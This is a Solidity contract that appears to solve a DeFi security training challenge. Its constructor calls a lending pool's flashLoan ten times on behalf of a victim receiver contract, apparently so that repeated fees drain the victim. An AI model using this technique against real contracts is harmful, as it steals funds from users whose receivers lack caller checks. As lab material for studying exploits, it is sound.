// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

interface IPool {
    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data) external;
}

contract NaiveAttacker {
    constructor(address payable poolAddress, address token, IERC3156FlashBorrower victimReceiver) {
        for (uint256 i = 0; i <= 9; i++) {
            // Henryk: We can also just use the pool interface directly but I wanted to define
            // my own to execute to prove that the actual concrete implementation wasn't special
            // NaiveReceiverLenderPool(poolAddress).flashLoan(receiver, token, 0, bytes(""));
            IPool(poolAddress).flashLoan(victimReceiver, token, 0, bytes(""));
        }
    }
}